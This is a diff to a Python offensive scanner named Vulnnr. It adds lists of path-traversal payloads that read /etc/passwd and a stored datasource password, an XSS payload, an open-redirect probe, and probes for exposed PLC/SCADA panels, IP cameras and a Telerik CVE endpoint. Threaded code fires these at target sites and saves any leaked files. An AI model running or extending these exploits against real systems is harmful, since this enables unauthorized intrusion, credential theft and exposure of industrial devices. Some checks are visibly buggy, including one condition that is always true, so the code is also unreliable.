@@ -90,7 +90,7 @@ def autoupdate():
     time.sleep(3)
     if Version in test.text:
         print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}looks like u are using Vulnnr v{Version} upto date!")
-        time.sleep(4)
+        time.sleep(3)
         os.system('cls;clear')
         banner()
     else:
@@ -112,7 +112,7 @@ dirs = [
     '/wordpress/wp-admin/',
     '/wp-content/wpbackitup_backups',
     '/backup',
-    'wp-login.php',
+    '/wp-login.php',
     '/wp-json/wp/v2/users/',
     '/wp-config.php.save',
     '/wp-config.php_bak',
@@ -152,6 +152,14 @@ dirs = [
     '/phpMyBackup',
     '/phpmybackup',
     '/wp-content/uploads/private'
+]
+dorks = [
+    '/plc/webvisu.htm',
+    '/telerik.web.ui.webresource.axd?type=rau',
+    '/CFIDE/adminapi',
+    '/cgi-bin/guestimage.html',
+    '/gnc/API_External_Services.cfc',
+    '/config.php_old'
 ]
 
 DowloadConfig = [
@@ -210,7 +218,34 @@ DowloadConfig = [
  '/lib/downloader.php?file_name=../../../../../../etc/passwd',
  '/lib/download.php?file=../../../../../../etc/passwd',
  '/lib/download.php?name=../../../../../../etc/passwd',
- '/download.php?name=../../../../../../etc/passwd'
+ '/download.php?name=../../../../../../etc/passwd',
+ '/SEACMS111/5f9js3/admin_safe.php?action=download&file=../../../../../../etc/passwd',
+ '/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00',
+ '/index.php?option=com_realtyna&controller=../../../../../../../../../../etc/passwd%00',
+ '/fhem/FileLog_logWrapper?dev=Logfile&file=/etc/passwd&type=text',
+ '/index.php?page=/etc/passwd',
+ '/imgsize.php?img=/etc/passwd&w=0',
+ '/boltwire/index.php?p=action.search&action=../../../../../../../etc/passwd',
+ '/index.php?action=../../../../../../../etc/passwd',
+ '/index.php?p=../../../../../../../etc/passwd',
+ '/wp-content/plugins/media-library-assistant/includes/mla-file-downloader.php?mla_download_type=text/html&mla_download_file=/etc/passwd',
+ '/faq.php?show=/etc/passwd&c=guidelines',
+ '/blog/faq.php?show=/etc/passwd&c=guidelines',
+ '/wp-content/plugins/tutor/views/pages/instructors.php?sub_page=/etc/passwd',
+ '/index.php?page_slug=../../../../../etc/passwd%00',
+ '/?op=page&tmpl=../../../../../../../etc/passwd',
+ '/sh-cdn/yazi.php?yazi=/etc/passwd',
+ 'small.php?section=/etc/passwd',
+ '/kmrs/exportmanager/ajax/getfiles?f=/../../../../../../../../../../etc/passwd',
+ '/exportmanager/ajax/getfiles?f=/../../../../../../../../../../etc/passwd',
+ '/webmail/calendar/minimizer/index.php?style=/etc/passwd',
+ '/calendar/minimizer/index.php?style=/etc/passwd',
+ '/cgi-bin/Maconomy/MaconomyWS.macx1.W_MCS//etc/passwd',
+ '/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/',
+ '/OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd',
+ '/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties',
+ '/.well-known/acme-challenge/%3C%3fxml%20version=%221.0%22%3f%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert%28"XSS"%26%23x29%3B%3C/x:script%3E',
+ '/gotoURL.asp?url=fedsearch.xyz&id=43569'
 ]
 
 
@@ -218,7 +253,7 @@ DowloadConfig = [
 def config(url, path):
     try:
         Exp = url + str(path)
-        GetConfig = requests.get(Exp, headers=HEADERS)
+        GetConfig = requests.get(Exp, headers=HEADERS, timeout=timeout)
         filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", '')+".txt"
         if GetConfig.status_code == 200:
             if "DB_NAME" in GetConfig.text:
@@ -248,9 +283,24 @@ def config(url, path):
                     f.write(f"\nLFI RESULTS:\n{GetConfig.text}\n\n\n")
                 f.close()
                 print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}LFI config ={GREEN} Found {RESET} results saved to {GREEN}{filename}")
+            elif "ctpDataSource.password" in GetConfig.text:
+                filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
+                with io.open(filename, "a+", encoding="utf-8") as f:
+                        #f.write(f"{GetConfig.url}\n\n") Sometimes it outputs weird shit LOL
+                    f.write(f"\nLFI RESULTS:\n{GetConfig.text}\n\n\n")
+                f.close()
+                print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}LFI config ={GREEN} Found {RESET} results saved to {GREEN}{filename}")
+            elif "XSS" in GetConfig.text:
+                print(f"{PURPLE} [ {GREEN}$ {PURPLE}] {RESET}XSS {PURPLE}=> {RESET}{GetConfig.url}")
+            elif "fedsearch" in GetConfig.text:
+                print(f"{PURPLE} [ {GREEN}$ {PURPLE}] {RESET}Open REDI {PURPLE}=> {RESET}{GetConfig.url}")
     except:
         #print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Connection Timout\n")
         return
+
+
+
+
 
 
 def com_s5(url):
@@ -343,10 +393,47 @@ def dirsscan(url, path):
 
         
     
+def dorkinfos(url, path):
+    Exp = url + str(path)
+    GetConfig = requests.get(Exp, headers=HEADERS, timeout=timeout)
+    filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", '')+".txt"
+    if GetConfig.status_code == 200:
+        if "404" in GetConfig.text:
+            pass
+        elif "file not found" in GetConfig.text:
+            pass
+        elif "CoDeSys WebVisualization" in GetConfig.text:
+            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}| {YELLOW}(PLC/SCADA web visual interface)")
+        elif "RadAsyncUpload handler is registered succesfully, however, it may not be accessed directly.":
+            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}| {YELLOW}https://github.com/noperator/CVE-2019-18935")
+        elif "Index of /CFIDE/adminapi" in GetConfig.text:
+            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}")
+        elif "Camera Live Image" in GetConfig.text:
+            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET} | {YELLOW}IP Cameras")
+        elif "Adobe, the Adobe logo, ColdFusion, and Adobe ColdFusion are trademarks or registered trademarks of Adobe" in GetConfig.text:
+            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET} | {YELLOW}Contains Login Portals")
 
 
 
+        
 
+def dorkinfo(url):
+    global flag
+    thread = []
+    flag = False
+    for path in dorks:
+        if not flag == False:
+            return 
+        t = threading.Thread(target=dorkinfos, args=(url, path))
+        t.start()
+        thread.append(t)
+        
+
+    for j in thread:
+        j.join()
+
+    if flag == False:
+        return 
     
 
 
@@ -562,11 +649,12 @@ def Localize(url):
     test = requests.get(url+"/wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../../../../../etc/passwd")
     if test.status_code == 200:
         filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
-        with open(filename, "a+") as f:
-            f.write(f"EXPLOIT: {test.url}\n\n")
-            f.write(test.text)
-        f.close()
-        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Localize LFI {PURPLE}=>{RESET} {GREEN}Vuln saved to {GREEN}" + filename)
+        if "root:x" in test.text:
+            with open(filename, "a+") as f:
+                f.write(f"EXPLOIT: {test.url}\n\n")
+                f.write(test.text)
+            f.close()
+            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Localize LFI {PURPLE}=>{RESET} {GREEN}Vuln saved to {GREEN}" + filename)
     else:
         print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Localize LFI {PURPLE}=>{RESET} {RED}Not Vuln")
 
@@ -1199,6 +1287,15 @@ def gf(url):
     else:
         print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}b2jcontact EXP {PURPLE}=> {RED}Not Vuln")
 
+
+    Obra = requests.get(url, timeout=timeout)
+    if "Created by Obra soft" in Obra.text:
+        if "404" in Obra.text:
+            pass
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Obra SQL {PURPLE}=> {GREEN}Vuln{RESET} | {YELLOW} SQL Injection {GREEN}https://cxsecurity.com/issue/WLB-2021030187")
+    else:
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Obra SQL {PURPLE}=> {RED}Not Vuln")
+
 def CheckSqliURL(site, urls):
     MaybeSqli = []
     try:
@@ -1433,6 +1530,7 @@ def auto(url):
             
 
             dirs2(url)
+            dorkinfo(url)
             wp_dirs(url)
             
             #Exploitt(site) SQL Injection does not go well with Wordpress LOL
@@ -1470,6 +1568,7 @@ def auto(url):
         elif "Joomla" in cms['name']:
             print(f"\n {PURPLE}[ {GREEN}~ {RESET} Starting Joomla Scan! {GREEN}~{RESET} {PURPLE}]{RESET}\n")
             com_gmap(url)
+            dorkinfo(url)
             Exploit(url)
             LFI(site)
             dirs2(url)
@@ -1489,7 +1588,9 @@ def auto(url):
 
         else:
             print(f" {PURPLE}[ {GREEN}~ {RESET} Could not detect CMS {GREEN}~{RESET} {PURPLE}]{RESET}\n")
+            bootme(url)
             dirs2(url)
+            dorkinfo(url)
             #print(f" {PURPLE}[ {GREEN}~ {RESET} Starting Dirscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
             Exploit(url)
             LFI(site)
@@ -1591,14 +1692,14 @@ def Triconsole(url):
     test = requests.get(url+'/calendar/calendar_form.php/"><h1>Vulnnr</h1>')
     test1 = requests.get(url+'/calendar_form.php/"><h1>Vulnnr</h1>')
     
-    if "Vulnnr" in test.text:
+    if "<h1>Vulnnr<h1>" in test.text:
         if test.status_code == 200:
             filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
             with open(filename, "a+") as f:
                 f.write(test.url + '\n')
             print(f"{PURPLE} [ {GREEN}$ {PURPLE}]{RESET} Triconsole XSS {PURPLE}=> {GREEN}Vuln {RESET}results saved to {GREEN}{filename}")
         
-    elif "Vulnnr" in test1.text:
+    elif "<h1>Vulnnr<h1>" in test1.text:
         if test1.status_code == 200:
             print(f"{PURPLE} [ {GREEN}$ {PURPLE}]{RESET} Triconsole XSS {PURPLE}=> {GREEN}Vuln {RESET}results saved to {GREEN}{filename}")
             filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
